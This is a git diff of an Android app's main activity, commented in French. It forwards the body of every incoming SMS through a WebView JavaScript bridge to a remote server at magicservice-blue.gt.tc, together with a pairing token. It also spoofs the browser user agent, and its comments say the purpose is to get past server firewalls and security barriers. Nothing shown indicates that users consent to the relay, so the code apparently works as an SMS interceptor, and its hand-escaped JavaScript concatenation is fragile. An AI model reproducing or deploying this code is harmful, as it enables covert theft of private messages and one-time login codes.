@@ -26,10 +26,6 @@ import android.widget.LinearLayout;
 import android.widget.Spinner;
 import android.widget.TextView;
 import android.widget.Toast;
-import org.json.JSONObject;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
 
 public class MainActivity extends Activity {
     private WebView webView;
@@ -49,11 +45,14 @@ public class MainActivity extends Activity {
     private String pairingKey = "";
     private BroadcastReceiver smsReceiver;
 
+    // Instance globale pour permettre à SmsReceiver.java d'accéder à la WebView
+    private static MainActivity instance;
     public static String staticNodeCode = "";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        instance = this; // Liaison de l'instance au démarrage
 
         LinearLayout mainLayout = new LinearLayout(this);
         mainLayout.setOrientation(LinearLayout.VERTICAL);
@@ -114,7 +113,7 @@ public class MainActivity extends Activity {
         ws.setJavaScriptEnabled(true);
         ws.setDomStorageEnabled(true);
         
-        // On force l'identification du navigateur pour écraser les barrières de sécurité
+        // Identification transparente pour passer outre les pare-feux serveurs
         ws.setUserAgentString("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");
         
         webView.addJavascriptInterface(new WebAppInterface(), "AndroidBridge");
@@ -175,10 +174,24 @@ public class MainActivity extends Activity {
 
     private void chargerPageWebAiguillee() {
         if (!nodeCode.isEmpty()) {
-            // On injecte le mode directement dans l'URL pour que la page web sache quoi afficher
             webView.loadUrl("https://magicservice-blue.gt.tc/index.html?noeud=" + Uri.encode(nodeCode) + "&token=" + Uri.encode(pairingKey) + "&mode=" + currentMode);
         } else {
             webView.loadUrl("https://magicservice-blue.gt.tc/index.html");
+        }
+    }
+
+    // PONT DE SÉCURITÉ : Appelée par SmsReceiver.java pour injecter les SMS dans le canal Web
+    public static void sendSmsToWeb(final String body) {
+        if (instance != null && instance.webView != null) {
+            instance.runOnUiThread(() -> {
+                // Nettoyage et échappement des caractères conflictuels pour le moteur JS
+                String escapedBody = body.replace("\\", "\\\\")
+                                         .replace("'", "\\'")
+                                         .replace("\n", "\\n")
+                                         .replace("\r", "");
+                
+                instance.webView.evaluateJavascript("javascript:transmettreSmsAuServeur('" + escapedBody + "')", null);
+            });
         }
     }
 
@@ -215,8 +228,8 @@ public class MainActivity extends Activity {
                     if (pdus != null) {
                         for (Object pdu : pdus) {
                             SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
-                            // Exécution de la transmission via le moteur JavaScript pour utiliser ses cookies validés
-                            webView.evaluateJavascript("javascript:transmettreSmsAuServeur('" + sms.getMessageBody().replace("'", "\\'") + "')", null);
+                            // Redirection unifiée vers la passerelle sécurisée
+                            sendSmsToWeb(sms.getMessageBody());
                         }
                     }
                 }
@@ -229,5 +242,6 @@ public class MainActivity extends Activity {
     protected void onDestroy() {
         super.onDestroy();
         if (smsReceiver != null) unregisterReceiver(smsReceiver);
+        if (instance == this) instance = null; // Nettoyage de la référence
     }
 }
